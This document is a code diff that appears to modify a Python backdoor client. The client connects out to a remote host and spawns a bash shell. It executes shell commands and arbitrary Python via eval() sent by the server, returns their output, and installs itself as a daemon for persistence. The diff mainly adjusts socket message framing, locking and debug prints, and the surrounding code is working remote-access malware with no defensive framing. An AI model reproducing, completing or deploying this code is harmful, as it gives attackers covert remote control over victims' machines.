@@ -21,8 +21,6 @@ EVAL = "eval"
 CMD = "cmd"
 
 # Supporting classes
-
-
 class FormatSocket:
 
     SIZE_BYTES = 4
@@ -53,13 +51,19 @@ class FormatSocket:
         :param recvable: Any object with recv(bytes) function
         :return:
         '''
+
         total_data = self.lastbytes
         self.lastbytes = b''
 
         msg_data = b''
         expected_size = sys.maxsize
+
+        if len(total_data) > FormatSocket.SIZE_BYTES:
+            size_data = total_data[:FormatSocket.SIZE_BYTES]
+            expected_size = struct.unpack('>i',size_data)[0]
+            msg_data += total_data[FormatSocket.SIZE_BYTES:]
+
         while len(msg_data) < expected_size:
-            print("waiting on size")
             sock_data = self.sock.recv(FormatSocket.RECV_SIZE)
             total_data += sock_data
             if expected_size == sys.maxsize and len(total_data) > FormatSocket.SIZE_BYTES:
@@ -77,21 +81,19 @@ class ByteLockBundler:
         self.stdoutbytes = b''
         self.stderrbytes = b''
         self.fsock = fsock
-        self.bytelock = threading.Lock()
-
-    def setLock(self,lock):
-        self.bytelock = lock
+        # Should improve with read-priority lock
+        self.lock = threading.Lock()
 
     def writeStdout(self, wbytes):
-        with self.bytelock:
+        with self.lock:
             self.stdoutbytes += wbytes
 
     def writeStderr(self, wbytes):
-        with self.bytelock:
+        with self.lock:
             self.stderrbytes += wbytes
 
     def getAndClear(self):
-        with self.bytelock:
+        with self.lock:
             out,err = self.stdoutbytes, self.stderrbytes
             self.stdoutbytes = b''
             self.stderrbytes = b''
@@ -105,7 +107,6 @@ class ByteLockBundler:
             self.fsock.send(json_str)
 
 # Scripts
-
 def main():
     while True:
         if hasInternetConnection():
@@ -119,7 +120,6 @@ def main():
                 s.connect((HOST, PORT))
                 fs = FormatSocket(s)
                 fs.send(json_str)
-                print("[+] Sent")
                 serve(fs)
             except Exception as e:
                 # TODO: Remove debug code
@@ -129,12 +129,10 @@ def main():
 
 def serve(sock):
     bytelock = ByteLockBundler(sock)
-
     proc = subprocess.Popen(["bash"],
                             stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)
-
     # Get commands from server, parse and send appropriate to proc
     def pollProcStdout():
         while True:
@@ -153,23 +151,25 @@ def serve(sock):
                 bytelock.writeStderr(out)
 
     def pollSock():
-        recvbytes = sock.recv()
-        print(recvbytes)
-        recvjson = json.loads(recvbytes.decode('UTF-8'))
-        if STDIN in recvjson:
-            proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
-            proc.stdin.flush()
-        if CMD in recvjson:
-            cmd_str = recvjson[CMD]
-            cmd_arr = cmd_str.split(" ")
-            newproc = subprocess.Popen(cmd_arr)
-        if EVAL in recvjson:
-            eval(recvjson[EVAL])
+        while True:
+            recvbytes = sock.recv()
+            recvjson = json.loads(recvbytes.decode('UTF-8'))
+            if STDIN in recvjson:
+                proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
+                proc.stdin.flush()
+            if CMD in recvjson:
+                cmd_str = recvjson[CMD]
+                cmd_arr = cmd_str.split(" ")
+                newproc = subprocess.Popen(cmd_arr)
+            if EVAL in recvjson:
+                eval(recvjson[EVAL])
 
     def writeBundles():
         while True:
             time.sleep(0.2)
+            print("Sending?")
             bytelock.writeBundle()
+            print("Sent!")
 
     # make thread for each function + one to send json with output to server
     t_sock = threading.Thread(target=pollSock)
@@ -274,7 +274,6 @@ def install():
             except:
                 pass
     if daemon_loc is not None:
-        print("Wrote to: {0} {1}".format(script_path, daemon_loc))
         return True
 
 
